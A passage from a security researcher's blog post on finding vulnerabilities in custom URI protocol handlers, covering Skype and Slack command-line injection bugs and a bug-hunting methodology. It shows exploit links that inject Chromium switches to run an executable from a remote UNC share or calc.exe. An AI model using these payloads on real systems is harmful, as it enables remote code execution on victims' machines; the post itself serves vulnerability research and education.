+<a class=header-link href=#skype-command-injection-via-browser-subprocess-command><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>This payload combines two of the techniques we have seen. command-line switch
+injection and remote files.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>a</span> hred<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;skype://?&#34;
+</span><span style=color:#2aa198>  --secondary
+</span><span style=color:#2aa198>  --browser-subprocess-path=\\192.168.0.1\uncshare\sh.exe
+</span><span style=color:#2aa198>&#39;</span>&gt;
+</code></pre></div><p>I cannot find any information about the <code>secondary</code> flag in
+<a href=https://chromium.googlesource.com/chromium/src/+/master/chrome/browser/flag_descriptions.cc target=_blank rel="noreferrer noopener">flag-descriptions.cc</a> but it is probably needed. Does it
+enable Chromium's secondary UI? I don't know.</p>
+<p>The <a href=https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#32 target=_blank rel="noreferrer noopener">browser-subprocess-command</a> specifies an
+executable for the Chromium renderer and plugin subprocesses. It's set to a
+remote file via a UNC path. Skype would execute it when creating a renderer
+subprocess and the attacker would get remote code execution.</p>
+<p>During the review, we had this question about the remote file. Will the OS show
+a prompt and ask for confirmation before executing a remote executable? I don't
+know. If you do, please let me know. I think in this case, the framework does it
+automagically and there is no prompt? Honestly, we have to find a copy of the
+vulnerable version and try it.</p>
+<h3 id=slack-command-line-injection-via-browser-subprocess-command>Slack command-line Injection via browser-subprocess-command
+<a class=header-link href=#slack-command-line-injection-via-browser-subprocess-command><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>The Slack exploit is similar to the previous bug. There is one difference.
+According to the article, an existing instance of Slack would prevent the
+exploit. They got around by supplying <code>user-data-dir</code>. This runs the instance
+run under a new user (e.g., profile) and work.</p>
+<p>The exploit URI uses calc but I think we can assume it can execute a remote file
+like the Skype version (doubt).</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>a</span> href<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;slack://&#34;
+</span><span style=color:#2aa198>  --user-data-dir=.
+</span><span style=color:#2aa198>  -- browser-subprocess-path=C:/Windows/System32/calc.exe
+</span><span style=color:#2aa198>&#39;</span>&gt;
+</code></pre></div><p>There are two more similar advisories. but as I said the ZDI advisory pages do not have
+any details and I was not able to find any public info. Both apps use CEF.</p>
+<ul>
+<li><a href=https://www.zerodayinitiative.com/advisories/ZDI-18-280/ target=_blank rel="noreferrer noopener">Spotify Music Player URI parsing Command Injection Remote Code Execution Vulnerability</a></li>
+<li><a href=https://www.zerodayinitiative.com/advisories/ZDI-18-215/ target=_blank rel="noreferrer noopener">Amazon Music Player URI parsing Command Injection Remote Code Execution Vulnerability</a></li>
+</ul>
+<h1 id=so-how-do-i-get-started>So, How Do I Get Started?
+<a class=header-link href=#so-how-do-i-get-started><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>After reading these bugs you are now motivated to go and find things and
+hopefully, make some dosh.</p>
+<h2 id=listing-all-registered-protocol-handlers>Listing All Registered Protocol Handlers
+<a class=header-link href=#listing-all-registered-protocol-handlers><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>If you are targeting a specific program you probably already know the URI scheme
+during your initial attack surface analysis (you did one, didn't you?).
+<a href=https://www.nirsoft.net/utils/url_protocol_view.html target=_blank rel="noreferrer noopener">URLProtocolView</a> by Nirsoft is a great tool to view
+all of these schemes.</p>
+<p>Next, check how the URI is passed to the app. In URLProtocolView we can see it
+under the <code>Command-Line</code> column. Here's the entry for the Nord VPN URI scheme we
+saw before. This shows if there are any extra command-line switches. You can
+also see it in action with procmon.</p>
+<span class=caption-wrapper>
+<img class=caption src=04-nordvpn-uri.png title=NordVPN.Notification alt=NordVPN.Notification>
+<span class=caption-text>NordVPN.Notification</span>
+</span>
+<p>Unfortunately, there is no set-piece strategy after that. I usually look for
+these things.</p>
+<h2 id=command-line-switches>Command-Line Switches
+<a class=header-link href=#command-line-switches><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>This could be as easy as running <code>app.exe -h/--help</code> or reading the
+documentation. Sometimes, you can just run the app with some random input and it
+will print a helpful list of switches.</p>
+<p>But more often than not you need to debug/RE the app (I am better at dynamic
+analysis). Often, commercial closed source apps have some hidden/debug switches
+that are not publicly known. Sometimes, setting "debug mode" disables some of
+the protections (remember the Chromium switches that disabled the sandbox?).</p>
+<p><a href=https://twitter.com/jeffssh target=_blank rel="noreferrer noopener">@Jeffssh</a> mentioned that we can just run <code>strings</code> on the
+binary.</p>
+<h2 id=how-parameters-are-processed>How Parameters are Processed
+<a class=header-link href=#how-parameters-are-processed><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Does the app parse the string and extract parameters or is it expecting a string
+in a specific format (like the Nord VPN serialized string) and returns an
+error/ignores the rest? Sometimes, the app is helpful and parses the string into
+its argument/value tuples.</p>
+<h2 id=flow-analysis>Flow Analysis
+<a class=header-link href=#flow-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>After you have figured out what switches and input are available you need to
+figure out where this input ends up. I mentioned how dnSpy helps with that.
+Sometimes, there is no need to do this because a switch results in an exploit
+(e.g., the mIRC bug).</p>
+<h2 id=passing-remote-files>Passing Remote Files
+<a class=header-link href=#passing-remote-files><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Check if the app accepts UNC paths and remote files. Pass a UNC path and see if
+the file is accessed. Create a local share on your machine and then do
+<code>\\localhost\share\path\to\file</code>. Make sure to disable authentication for the
+share.</p>
+<h1 id=what-did-we-learn-here-today>What Did We Learn Here Today?
+<a class=header-link href=#what-did-we-learn-here-today><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>We learned how to look for vulnerabilities in custom protocol handlers. We
+reviewed a good number of bugs and learned quite a few techniques. Go and find
+these in the wild. If you do (and you can), please publish your write-ups and
+let me know.</p>
+<h2 id=do-you-wanna-know-more>Do You Wanna Know More?
+<a class=header-link href=#do-you-wanna-know-more><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Now, we know enough to get started. But be sure to read these references,
+later.</p>
+<ul>
+<li><a href=https://docs.microsoft.com/en-us/archive/blogs/ieinternals/understanding-protocols target=_blank rel="noreferrer noopener">Understanding Protocols on docs.microsoft.com</a> is an
+oldie but a goodie.</li>
+<li><a href=https://www.vdoo.com/blog/exploiting-custom-protocol-handlers-in-windows target=_blank rel="noreferrer noopener">Exploiting Custom Protocol Handlers in Windows</a> by Andrey Polkovnychenko.</li>
+<li><a href=https://www.slideshare.net/JeremyBrown37/provoking-windows-dragoncon-2016 target=_blank rel="noreferrer noopener">Provoking Windows - DragonCon 2016 - start at slide 77</a> by Jeremy Brown.</li>
+<li><a href=https://www.blackhat.com/presentations/bh-europe-08/McFeters-Rios-Carter/Presentation/bh-eu-08-mcfeters-rios-carter.pdf target=_blank rel="noreferrer noopener">URI Use and Abuse - Black Hat Europe 2008 - slides</a> and
+<a href=https://www.blackhat.com/presentations/bh-europe-08/McFeters-Rios-Carter/Whitepaper/bh-eu-08-mcfeters-rios-carter-WP.pdf target=_blank rel="noreferrer noopener">whitepaper</a> by Nathan McFeters, Billy Rios, and Rob Carter.</li>
+<li><a href=https://blog.chichou.me/2018/01/28/electron-s-bug-shellexecute-to-blame/ target=_blank rel="noreferrer noopener">Electron's bug, ShellExecute to blame?</a> by
+<a href=https://twitter.com/CodeColorist target=_blank rel="noreferrer noopener">@CodeColorist</a>.
+<ul>
+<li>Mostly discusses the quirks of ShellExecute.</li>
+</ul>
+</li>
+<li><a href=https://2019.zeronights.ru/wp-content/themes/zeronights-2019/public/materials/1_ZN2019_Juho_Nurminen.pdf target=_blank rel="noreferrer noopener">Electron, scheme handlers, and stealthy security patches</a> by
+<a href=https://twitter.com/jupenur target=_blank rel="noreferrer noopener">Juho Nurminen</a>.</li>
+</ul>
+<h1 id=acknowledgements>Acknowledgements
+<a class=header-link href=#acknowledgements><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Special thanks to everyone who publishes their bugs so we can learn and
+specially these great folks who also reviewed my explanation of their bugs and
+gave me feedback (in alphabetical order):</p>
+<ul>
+<li><a href=https://twitter.com/b1ack0wl target=_blank rel="noreferrer noopener">@b1ack0wl</a></li>
+<li><a href=https://twitter.com/cyku_tw target=_blank rel="noreferrer noopener">@Cyku</a></li>
+<li><a href=https://twitter.com/jeffssh target=_blank rel="noreferrer noopener">@jeffssh</a></li>
+<li><a href=https://twitter.com/zer0pwn target=_blank rel="noreferrer noopener">@zer0pwn</a></li>
+</ul>
+</div>
+<footer>
+<p class=meta>
+<span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
+<time>Mar 17, 2021</time>
+</span>
+</p>
+<p class=meta>
+<a class="basic-alignment left" href=https://parsiya.net/blog/2021-02-17-automagically-deploying-websites-with-custom-domains-to-github-pages/ title="Automagically Deploying Websites with Custom Domains to GitHub Pages">Automagically Deploying Websites with Custom Domains to GitHub Pages</a>
+<a class="basic-alignment right" href=https://parsiya.net/blog/2021-04-30-testing-extensions-in-chromium-browsers-nordpass/ title="Testing Extensions in Chromium Browsers - Nordpass">Testing Extensions in Chromium Browsers - Nordpass</a>
+</p>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//parsiya.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</footer>
+</article>
+</div>
+<aside class="sidebar thirds">
+<section class="first odd">
+<h1>Who am I?</h1>
+<p>
+<p>I am Parsia, a senior security engineer at <a href=https://www.ea.com/security>Electronic Arts</a>.</p>
+<p>I write about application security, reverse engineering,
+Go, cryptography, and (obviously) videogames.</p>
+<p>Click on <a href=/about/>About Me!</a> to know more.</p>
+</p>
+</section>
+<ul class=sidebar-nav>
+<li class=sidebar-nav-item>
+<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://keybase.io/parsiya/ title=https://keybase.io/parsiya/><i class="fa fa-keybase fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a>
+</li>
+</ul>
+<section class=odd>
+<h1>Collections</h1>
+<li>
+<a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a>
+</li>
+<li>
+<a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a>
+</li>
+</section>
+</aside>
+</div>
+</div>
+<footer role=contentinfo>
+<p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.
+</p>
+</footer>
+</body>
+</html>
